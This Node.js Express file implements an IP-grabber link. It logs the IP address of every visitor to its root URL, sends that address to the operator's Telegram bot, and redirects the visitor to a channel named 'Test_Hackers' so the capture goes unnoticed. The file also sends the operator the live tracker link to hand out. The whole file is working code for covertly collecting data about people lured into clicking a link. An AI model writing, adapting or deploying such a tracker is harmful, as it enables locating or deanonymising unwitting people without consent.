const express = require("express");
const fetch = require("node-fetch");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_CHANNEL = "https://t.me/Test_Hackers";

// Send IP and redirect
app.set("trust proxy", true);
app.get("/", async (req, res) => {
  const ip = req.ip;

  const msg = `🚨 New Visitor IP Logged: ${ip}`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;

  try {
    await fetch(url);
  } catch (error) {
    console.error("Failed to send message to Telegram:", error);
  }

  res.redirect(TELEGRAM_CHANNEL);
});

// Start server and send tracker link
app.listen(PORT, async () => {
  const liveURL = `https://${process.env.RAILWAY_STATIC_URL || "your-project-name.up.railway.app"}`;
  console.log(`🚀 Server running at ${liveURL}`);

  const startMsg = `🚀 Tracker is now live!\n\n🔗 Link: ${liveURL}`;
  const notifyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(startMsg)}`;

  try {
    await fetch(notifyUrl);
    console.log("✅ Tracker link sent to Telegram.");
  } catch (error) {
    console.error("❌ Could not send tracker link:", error);
  }
});
